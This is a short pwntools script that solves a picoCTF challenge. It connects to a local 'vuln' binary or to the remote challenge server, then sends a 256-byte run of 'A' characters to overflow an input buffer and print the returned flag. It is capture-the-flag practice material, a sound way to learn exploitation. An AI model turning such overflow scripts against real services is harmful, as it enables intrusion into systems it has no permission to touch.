from pwn import *


def debug():
	if args.DEBUG:
		context.log_level = 'debug'

def conn():
	if args.REMOTE:
		url = "saturn.picoctf.net" 
		port = 65445
		p = remote(url, port)
	else:
		elf = ELF("vuln")
		p = elf.process()
	return p

def go_to_vuln(p):
	p.recvuntil(b'Input: ')

def get_flag(p, payload):
	p.sendline(payload)
	flag = p.recvline().decode().strip()
	return flag

def create_payload():
	payload = b"A" * 0x100
	return payload


debug()
p = conn()
go_to_vuln(p)
flag = get_flag(p, create_payload())

log.success("Flag: " + flag)